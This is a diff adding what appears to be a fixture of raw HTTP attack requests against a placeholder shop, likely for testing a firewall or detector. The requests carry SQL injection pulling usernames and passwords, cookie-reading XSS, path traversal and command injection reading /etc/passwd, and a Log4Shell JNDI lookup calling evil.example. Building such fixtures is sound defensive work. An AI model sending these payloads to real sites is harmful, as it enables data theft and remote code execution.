@@ -1,0 +1,55 @@
+GET /?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1
+Host: shop.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
+Accept-Language: en-US,en;q=0.5
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+
+GET /search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1
+Host: shop.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
+Accept-Language: en-US,en;q=0.5
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+
+GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+Host: shop.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
+Accept-Language: en-US,en;q=0.5
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+
+POST /comments HTTP/1.1
+Host: shop.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
+Accept-Language: en-US,en;q=0.5
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+
+comment=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+POST /api/cart HTTP/1.1
+Host: shop.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
+Accept-Language: en-US,en;q=0.5
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+Content-Length: 75
+
+{"productId":"1 UNION SELECT username, password FROM users--","quantity":1}
+
+GET /ping?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd HTTP/1.1
+Host: shop.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
+Accept-Language: en-US,en;q=0.5
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+
+GET /products?id=42 HTTP/1.1
+Host: shop.example.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
+Accept-Language: en-US,en;q=0.5
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+X-Api-Version: ${jndi:ldap://evil.example/a}
+
